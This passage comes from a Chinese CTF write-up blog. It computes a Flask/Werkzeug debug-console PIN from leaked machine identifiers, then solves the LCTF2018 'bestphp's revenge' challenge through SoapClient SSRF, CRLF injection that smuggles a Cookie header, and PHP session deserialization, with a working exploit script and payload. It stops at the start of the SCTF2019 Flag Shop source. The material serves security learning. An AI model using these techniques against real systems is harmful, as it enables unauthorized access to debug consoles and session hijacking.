class="line">对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<span class="regexp">/etc/m</span>achine-id或<span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>random<span class="regexp">/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/</span>proc<span class="regexp">/self/</span>cgroup，序列号为<span class="number">1</span>那行</span><br><span class="line"><span class="number">1</span>:name=systemd:<span class="regexp">/docker/</span><span class="number">73</span>e631540828d92c2d71a634670c201fa81ff3ea9790ce454d630df7d27e994e</span><br></pre></td></tr></table></figure>
<p>至此，所有参数获取完毕，输入有效载荷计算密码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;glzjin&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/site-packages/flask/app.pyc&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377869398&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;73e631540828d92c2d71a634670c201fa81ff3ea9790ce454d630df7d27e994e&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//PIN  <span class="number">111</span>-070-<span class="number">424</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu13.jpg"></p>
<p> [GYCTF2020]FlaskApp 同意可以用求PIN的方法求flag</p>
<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>php内置类SoapClient</strong></li>
<li><strong>CRLF Injection漏洞</strong></li>
<li><strong>call_user_func</strong></li>
<li><strong>PHPsession 反序列化</strong></li>
</ol>
<p><strong>一. SoapClient</strong></p>
<p><strong>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</strong><br><strong>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu14.jpg"></p>
<p>第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
<p><strong>简单的用法</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(location<span class="string">&#x27;=&gt;&#x27;</span>http:<span class="comment">//example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span></span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;a();</span><br></pre></td></tr></table></figure>


<p>可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu15.jpg"></p>
<p><strong>二. CRLF Injection漏洞</strong></p>
<p><strong>首先要对HTTPheaders 和 HTTPbody 要有一些基本的了解，如图，它们之前用空行区分</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu16.png"></p>
<p><strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br><strong>简单来说</strong><br><strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://localhost:2333&quot;</span>;</span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;location&quot;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&quot;user_agent&quot;</span> =&gt; <span class="string">&quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uri&quot;</span> =&gt; <span class="string">&quot;demo&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="variable">$options</span>);</span><br><span class="line"><span class="variable">$payload</span> = serialize(<span class="variable">$attack</span>);</span><br><span class="line">unserialize(<span class="variable">$payload</span>)-&gt;ff(); <span class="comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">→/home nc - lvp 2333</span><br><span class="line">listening on [any] 2333</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 42022</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost :2333</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line">User -Agent: mochazz</span><br><span class="line">Cookie: PHPSESSID= 123123    </span><br><span class="line"></span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;demo#a&quot;</span><br><span class="line">Content-Length: 365</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;S0AP- ENV:Envelope xmlns: S0AP- ENV= &quot;http:/ /schemas . xmlsoap . org/ soap/envelope/&quot; xmlns:ns1=&quot;demo&quot; xmIns :xsd=&quot;http:/ /www .w3.org/</span><br><span class="line">2001/XMLSchema&quot; xmIns : SOAP -ENC=&quot;http://schemas .xmlsoap .or g/soap/ encoding/&quot; SOAP- ENV:encodingStyle=&quot;http://schemas .xmlsoap.og/ soap/ encoding/&quot;&gt;&lt;S0AP - ENV : Body&gt;&lt;ns1 :a/&gt;&lt;/S0AP - ENV: Body&gt;&lt;/S0AP ENV: Envelope&gt;</span><br></pre></td></tr></table></figure>


<p> <strong>三. call_user_func</strong> </p>
<p> <strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p>
<p>先传入extract()，将$b覆盖成回调函数，这样题目中的 <strong>call_user_func($b,$a)</strong> 就可以变成 <strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
<p>四. PHPsession 反序列化</p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>session.save_handler</td>
<td>session保存形式。默认为files</td>
</tr>
<tr>
<td>session.save_path</td>
<td>session保存路径。</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>session序列化存储所用处理器。默认为php。</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>将上传文件的进度信息存在session中。默认开启。</td>
</tr>
</tbody></table>
<p>我们先通过一个样例代码，看看3种不同的 <strong>session</strong> 序列化处理器处理 <strong>session</strong> 的情况。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;mochazz&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当 <strong>session.serialize_handler=php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p>
<p>当 <strong>session.serialize_handler=php_serialize</strong> 时，session文件为： <code>a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;&#125;</code></p>
<p>当 <strong>session.serialize_handler=php_binary</strong> 时，session文件内容为： <code>二进制字符names:7:&quot;mochazz&quot;;</code></p>
<p><strong>而当session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞</strong></p>
<p><strong>php引擎会以|作为作为key和value的分隔符，我们在传入内容的时候，比如传入</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="variable">_SESSION</span>[‘<span class="built_in">name</span>’] = ‘|username‘</span><br></pre></td></tr></table></figure>
<p><strong>那么使用php_serialize引擎时可以得到序列化内容</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:”name”;s:<span class="number">4</span>:”|username”;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>然后用php引擎反序列化时，|被当做分隔符，于是</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:”name”;s:<span class="number">4</span>:”</span><br></pre></td></tr></table></figure>
<p><strong>被当作key</strong></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span></span><br></pre></td></tr></table></figure>
<p><strong>被当做vaule进行反序列化</strong></p>
<p><strong>于是，我们只要传入</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="variable">_SESSION</span>[‘<span class="built_in">name</span>’] = |序列化内容</span><br></pre></td></tr></table></figure>
<p><strong>即可触发漏洞</strong></p>
<hr>
<p>知识点就讲到这里，接下去来分析一下题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);  <span class="comment">//参数二的位置固定为 $_POST 数组，我们很容易便想到利用 extract 函数进行变量覆盖，以便配合后续利用</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;   <span class="comment">//存在 session 伪造漏洞，我们可以考虑是否可以包含 session 文件或者利用 session 反序列化漏洞</span></span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php  (扫目录扫到的)</span></span><br><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>分析下代码，flag.php 文件中告诉我们，只有 127.0.0.1 请求该页面才能得到 flag ，所以这明显又是考察 SSRF 漏洞，这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF </p>
<p>第一步：由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header ，构造 <strong>SoapClient</strong> 类，并用php_serialize引擎进行序列化，存入session</p>
<blockquote>
<p><strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</strong></p>
</blockquote>
<p>我们可以利用回调函数，通过给f传参，值为session_start，然后post提交   <code>array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;)</code></p>
<p>即达到<strong>session_start(array(‘serialize_handler’ =&gt; ‘php_serialize’))</strong> ，将会根据php7特性设置session.serialize_handler=php_serialize。而又因为session是可控的，可以通过传入name值，任意伪造。这里就想到name传入的是序列化值了，序列化exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;npfs\r\nCookie:PHPSESSID=123456\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$se</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.urlencode(<span class="variable">$se</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span></span><br></pre></td></tr></table></figure>
<p>执行脚本得到</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O<span class="variable">%3</span>A<span class="number">10</span><span class="variable">%3</span>A<span class="variable">%22</span>SoapClient<span class="variable">%22</span><span class="variable">%3</span>A<span class="number">4</span><span class="variable">%3</span>A<span class="variable">%7</span>Bs<span class="variable">%3</span>A<span class="number">3</span><span class="variable">%3</span>A<span class="variable">%22</span>uri<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">17</span><span class="variable">%3</span>A<span class="variable">%22</span>http<span class="variable">%3</span>A<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="number">127.0</span>.<span class="number">0.1</span><span class="variable">%2</span>F<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">8</span><span class="variable">%3</span>A<span class="variable">%22</span>location<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">25</span><span class="variable">%3</span>A<span class="variable">%22</span>http<span class="variable">%3</span>A<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="number">127.0</span>.<span class="number">0.1</span><span class="variable">%2</span>Fflag.php<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">11</span><span class="variable">%3</span>A<span class="variable">%22</span>_user_agent<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">31</span><span class="variable">%3</span>A<span class="variable">%22</span>npfs<span class="variable">%0</span>D<span class="variable">%0</span>ACookie<span class="variable">%3</span>APHPSESSID<span class="variable">%3</span>D<span class="number">123456</span><span class="variable">%0</span>D<span class="variable">%0</span>A<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">13</span><span class="variable">%3</span>A<span class="variable">%22</span>_soap_version<span class="variable">%22</span><span class="variable">%3</span>Bi<span class="variable">%3</span>A<span class="number">1</span><span class="variable">%3</span>B<span class="variable">%7</span>D</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu17.jpg"></p>
<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
<p>传值f=extract&amp;name=SoapClient      POST:b=call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu18.jpg"></p>
<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu19.jpg"></p>
<p>总的流程如下，图来源于网络<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%BA%8C" target="_blank">PHP反序列化入门之session反序列化</a></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu20.png"></p>
<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><strong>知识点：Ruby/erb模板注入</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread <span class="keyword">__FILE__</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span 